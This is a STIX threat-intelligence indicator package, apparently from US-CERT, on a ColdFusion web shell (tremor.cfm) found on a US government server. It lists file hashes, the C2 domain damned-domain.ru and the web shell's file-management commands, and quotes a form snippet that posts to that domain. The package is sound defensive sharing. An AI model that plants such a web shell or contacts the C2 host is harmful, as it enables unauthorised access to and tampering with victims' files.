@@ -1,0 +1,170 @@
+<stix:STIX_Package xmlns:cyboxVocabs="http://cybox.mitre.org/default_vocabularies-2" xmlns:indicator="http://stix.mitre.org/Indicator-2" xmlns:cyboxCommon="http://cybox.mitre.org/common-2" xmlns:FileObj="http://cybox.mitre.org/objects#FileObject-2" xmlns:stixCommon="http://stix.mitre.org/common-1" xmlns:URIObj="http://cybox.mitre.org/objects#URIObject-2" xmlns:marking="http://data-marking.mitre.org/Marking-1" xmlns:tlpMarking="http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1" xmlns:stixVocabs="http://stix.mitre.org/default_vocabularies-1" xmlns:cybox="http://cybox.mitre.org/cybox-2" xmlns:stix="http://stix.mitre.org/stix-1" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:CISCP="http://www.us-cert.gov/ciscp" id="CISCP:IB-14-10015" version="1.1.1" xsi:schemaLocation="http://cybox.mitre.org/objects#DomainNameObject-1 http://cybox.mitre.org/XMLSchema/objects/Domain_Name/1.0/Domain_Name_Object.xsd http://cybox.mitre.org/objects#PortObject-2 http://cybox.mitre.org/XMLSchema/objects/Port/2.1/Port_Object.xsd http://cybox.mitre.org/common-2 http://cybox.mitre.org/XMLSchema/common/2.1/cybox_common.xsd http://cybox.mitre.org/objects#WinRegistryKeyObject-2 http://cybox.mitre.org/XMLSchema/objects/Win_Registry_Key/2.1/Win_Registry_Key_Object.xsd http://stix.mitre.org/default_vocabularies-1 http://stix.mitre.org/XMLSchema/default_vocabularies/1.1.1/stix_default_vocabularies.xsd http://cybox.mitre.org/objects#FileObject-2 http://cybox.mitre.org/XMLSchema/objects/File/2.1/File_Object.xsd http://data-marking.mitre.org/Marking-1 http://stix.mitre.org/XMLSchema/data_marking/1.1.1/data_marking.xsd http://cybox.mitre.org/objects#SocketAddressObject-1 http://cybox.mitre.org/XMLSchema/objects/Socket_Address/1.1/Socket_Address_Object.xsd http://stix.mitre.org/common-1 http://stix.mitre.org/XMLSchema/common/1.1.1/stix_common.xsd http://data-marking.mitre.org/extensions/MarkingStructure#TLP-1 http://stix.mitre.org/XMLSchema/extensions/marking/tlp/1.1.1/tlp_marking.xsd http://stix.mitre.org/stix-1 http://stix.mitre.org/XMLSchema/core/1.1.1/stix_core.xsd http://cybox.mitre.org/objects#LinkObject-1 http://cybox.mitre.org/XMLSchema/objects/Link/1.1/Link_Object.xsd http://cybox.mitre.org/objects#AddressObject-2 http://cybox.mitre.org/XMLSchema/objects/Address/2.1/Address_Object.xsd http://cybox.mitre.org/default_vocabularies-2 http://cybox.mitre.org/XMLSchema/default_vocabularies/2.1/cybox_default_vocabularies.xsd http://cybox.mitre.org/objects#URIObject-2 http://cybox.mitre.org/XMLSchema/objects/URI/2.1/URI_Object.xsd http://stix.mitre.org/Indicator-2 http://stix.mitre.org/XMLSchema/indicator/2.1.1/indicator.xsd http://cybox.mitre.org/objects#EmailMessageObject-2 http://cybox.mitre.org/XMLSchema/objects/Email_Message/2.1/Email_Message_Object.xsd http://data-marking.mitre.org/extensions/MarkingStructure#Simple-1 http://stix.mitre.org/XMLSchema/extensions/marking/simple/1.1.1/simple_marking.xsd http://cybox.mitre.org/objects#MutexObject-2 http://cybox.mitre.org/XMLSchema/objects/Mutex/2.1/Mutex_Object.xsd http://cybox.mitre.org/objects#NetworkConnectionObject-2 http://cybox.mitre.org/XMLSchema/objects/Network_Connection/2.1/Network_Connection_Object.xsd http://us-cert.gov/ciscp http://www.us-cert.gov/sites/default/files/STIX_Namespace/ciscp_vocab_v1.1.1.xsd http://cybox.mitre.org/objects#HTTPSessionObject-2 http://cybox.mitre.org/XMLSchema/objects/HTTP_Session/2.1/HTTP_Session_Object.xsd http://cybox.mitre.org/cybox-2 http://cybox.mitre.org/XMLSchema/core/2.1/cybox_core.xsd">
+  <stix:STIX_Header>
+    <stix:Title>ColdFusion Malware Identified</stix:Title>
+    <stix:Package_Intent xsi:type="stixVocabs:PackageIntentVocab-1.0">Indicators - Malware Artifacts</stix:Package_Intent>
+    <stix:Description>On 27 November 2012, a malicious file was submitted for analysis from an unauthorized access incident at a US Government Department. The file tremor.cfm (MD5: 57d303b97c20dd2cf921f8c123ef9a97) was identified as a ColdFusion Markup file that provides remote file management capabilities via the web. The malware called back to damned-domain.ru.</stix:Description>
+    <stix:Handling>
+      <marking:Marking>
+        <marking:Controlled_Structure>//node()</marking:Controlled_Structure>
+        <marking:Marking_Structure color="GREEN" xsi:type="tlpMarking:TLPMarkingStructureType"/>
+      </marking:Marking>
+    </stix:Handling>
+    <stix:Information_Source>
+      <stixCommon:Time>
+        <cyboxCommon:Produced_Time>2014-01-09T17:25:35Z</cyboxCommon:Produced_Time>
+      </stixCommon:Time>
+    </stix:Information_Source>
+  </stix:STIX_Header>
+  <stix:Indicators>
+    <stix:Indicator id="CISCP:indicator-4b795fac-71c1-483c-a751-a421b4e33094" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Composite_Indicator_Expression operator="OR">
+        <indicator:Indicator idref="CISCP:indicator-eb820380-84ae-4158-9c88-c792f62d69a4"/>
+        <indicator:Indicator idref="CISCP:indicator-e0c9b7b0-610c-4e0c-a030-b65535e0193d"/>
+      </indicator:Composite_Indicator_Expression>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-eb820380-84ae-4158-9c88-c792f62d69a4" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">Malware Artifacts</indicator:Type>
+      <indicator:Description>This is a ColdFusion Markup file that provides remote file management capabilities via the web. The FileManager can be use as a common file manager or as a CFMODULE use inside an application. The functionality provided by this utility is provided within the file's comment tags.
+
+The functionality provided by this utility is provided within the
+file's comment tags. It reads as follows:
+&lt;!---
+Created by S?bastien Denis -
+1.0 : 23-nov-2004
+1.1 : 03-fev-2005 - new action: synchronize
+============================================================================
+The FileManager can be use as a common file manager or as a CFMODULE use inside an application.
+============================================================================
+Depending of the action (fuseaction attributes), the other attributes are...
+FUSEACTION OTHER ATTRIBUTES
+============================================================================
+PASSWORD
+If password is required to access the module.
+Display a form to enter password.
+PASSWORDHASH
+Hash the password.
+HOME
+Display the file manager.
+PATH (default= current path)
+EDITEXTENSIONS (list of extensions to enable file edition)
+GETDIR (default = current folder)
+SEARCH
+Perform a search.
+Return a query GETDIR and a call to fuseaction = HOME with this query.
+SEARCHNAME (reg exp corresponding to file/folder name)
+SEARCHTEXT (reg exp corresponding to file content)
+RECURSIVE (optional recursive search: 0/1 - default = 0)
+MAXSEARCHRESULT (number of result: n - default = 1)
+EDIT
+Edit a file
+EDITEXTENSIONS (list of extension - show the EDIT button)
+(default = txt,htm,html,cfm,cfml,asp,aspx,php,jsp,js,ini,bat,log,reg,xml,dtd,xslt)
+If "ALL", all files are editable
+PATH
+FILE
+WRITE
+Write the edited file
+PATH
+FILE
+FILENEWCONTENT
+UPLOAD PATH, NBROFUPLOAD (number of the maximum file to upload at once - default is 20)
+DOWNLOAD PATH, FILE
+ADDDIR PATH, DIRNEW
+ADDFILE PATH, FILENEW
+RENAMEFILE PATH, FILE, FILENEW
+RENAMEDIR PATH, DIR, DIRNEW
+COPYFILE PATH, FILE, PATHNEW (with the new file name)
+COPYDIR PATH, DIR, PATHNEW (with the new folder name)
+MOVEFILE PATH, FILE, PATHNEW (without the new file name)
+MOVEDIR PATH, DIR, PATHNEW (without the new folder name)
+DELETEFILE PATH, FILE
+DELETEDIR PATH, DIR
+DELETEDIRRECURSIVE PATH, DIR
+SYNCDIR PATH, PATHNEW (path; origin, pathNew: destination),
+OVERWRITEALL
+Other attributes:
+============================================================================
+thisModule the path to this module (cfmodule)
+default = listLast(cgi.script_name,"/\")
+relocate 0/1 (default 1, 0 in recursive call)
+CheckPassword default = ""
+To compare with H to allow access to module
+If no correspondance =&gt; fuseaction = password
+If checkPassword = "" =&gt; No access control.
+H The Hashed password always required if checkPassword neq "".
+PATHALLOWED The path beyond which the module cannot go.
+default = "" meaning no limits.
+STYLE 0/1 (default = 1) include basic style.
+---&gt;
+
+Form action tags within the file reference one domain. For example:
+&lt;cfcase value="password"&gt;
+&lt;cfoutput&gt;
+&lt;form action="http://damned-domain.ru:80/?" method="post"&gt;
+&lt;input type="hidden" name="fuseaction" value="passwordHash"&gt;
+Password: &lt;input type="password" name="password"&gt;&amp;nbsp;&lt;input
+type="submit" name="submit" value="Submit" class="button"&gt;
+&lt;/form&gt;
+&lt;/cfoutput&gt;
+&lt;/cfcase&gt;</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-5bb2a7d6-abd4-4ea5-beab-07f70b691ef3">
+        <cybox:Object id="CISCP:Object-116b1c7f-6c7c-44f3-aeb0-e8b27a1ca70b">
+          <cybox:Properties xsi:type="FileObj:FileObjectType">
+            <FileObj:File_Name condition="Equals">tremor.cfm</FileObj:File_Name>
+            <FileObj:Size_In_Bytes condition="Equals">42830</FileObj:Size_In_Bytes>
+            <FileObj:Hashes>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">MD5</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">57d303b97c20dd2cf921f8c123ef9a97</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SHA1</cyboxCommon:Type>
+                <cyboxCommon:Simple_Hash_Value condition="Equals">1bac37245ac27ed5fcf8410ce74f50ead5b7290e</cyboxCommon:Simple_Hash_Value>
+              </cyboxCommon:Hash>
+              <cyboxCommon:Hash>
+                <cyboxCommon:Type condition="Equals" xsi:type="cyboxVocabs:HashNameVocab-1.0">SSDEEP</cyboxCommon:Type>
+                <cyboxCommon:Fuzzy_Hash_Value condition="Equals">768:/YNEHXodlZhqT+qmUEawmc8DRxH96XkYL:/YNQEwTfmUEawmc81L6Xky</cyboxCommon:Fuzzy_Hash_Value>
+              </cyboxCommon:Hash>
+            </FileObj:Hashes>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-11-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+    <stix:Indicator id="CISCP:indicator-e0c9b7b0-610c-4e0c-a030-b65535e0193d" version="2.1.1" xsi:type="indicator:IndicatorType">
+      <indicator:Type xsi:type="stixVocabs:IndicatorTypeVocab-1.1">C2</indicator:Type>
+      <indicator:Description>The site damned-domain.ru was reported as a compromised server back in September 2012.</indicator:Description>
+      <indicator:Observable id="CISCP:Observable-8c2ed69d-8a0d-4339-9b8a-94e05c37d198">
+        <cybox:Object id="CISCP:Object-ad760077-b3e4-4355-8a82-2a9b058efbd1">
+          <cybox:Properties type="Domain Name" xsi:type="URIObj:URIObjectType">
+            <URIObj:Value condition="Equals">damned-domain.ru</URIObj:Value>
+          </cybox:Properties>
+        </cybox:Object>
+      </indicator:Observable>
+      <indicator:Kill_Chain_Phases>
+        <stixCommon:Kill_Chain_Phase kill_chain_id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" kill_chain_name="LM Cyber Kill Chain" name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+      </indicator:Kill_Chain_Phases>
+      <indicator:Sightings sightings_count="1">
+        <indicator:Sighting timestamp="2012-11-27T00:00:00"/>
+      </indicator:Sightings>
+    </stix:Indicator>
+  </stix:Indicators>
+  <stix:TTPs>
+    <stix:Kill_Chains>
+      <stixCommon:Kill_Chain definer="LMCO" id="stix:KillChain-af3e707f-2fb9-49e5-8c37-14026ca0a5ff" name="LM Cyber Kill Chain" number_of_phases="7" reference="http://www.lockheedmartin.com/content/dam/lockheed/data/corporate/documents/LM-White-Paper-Intel-Driven-Defense.pdf">
+        <stixCommon:Kill_Chain_Phase name="Reconnaissance" ordinality="1" phase_id="stix:KillChainPhase-af1016d6-a744-4ed7-ac91-00fe2272185a"/>
+        <stixCommon:Kill_Chain_Phase name="Weaponization" ordinality="2" phase_id="stix:KillChainPhase-445b4827-3cca-42bd-8421-f2e947133c16"/>
+        <stixCommon:Kill_Chain_Phase name="Delivery" ordinality="3" phase_id="stix:KillChainPhase-79a0e041-9d5f-49bb-ada4-8322622b162d"/>
+        <stixCommon:Kill_Chain_Phase name="Exploitation" ordinality="4" phase_id="stix:KillChainPhase-f706e4e7-53d8-44ef-967f-81535c9db7d0"/>
+        <stixCommon:Kill_Chain_Phase name="Installation" ordinality="5" phase_id="stix:KillChainPhase-e1e4e3f7-be3b-4b39-b80a-a593cfd99a4f"/>
+        <stixCommon:Kill_Chain_Phase name="Command and Control" ordinality="6" phase_id="stix:KillChainPhase-d6dc32b9-2538-4951-8733-3cb9ef1daae2"/>
+        <stixCommon:Kill_Chain_Phase name="Actions on Objectives" ordinality="7" phase_id="stix:KillChainPhase-786ca8f9-2d9a-4213-b38e-399af4a2e5d6"/>
+      </stixCommon:Kill_Chain>
+    </stix:Kill_Chains>
+  </stix:TTPs>
+</stix:STIX_Package>
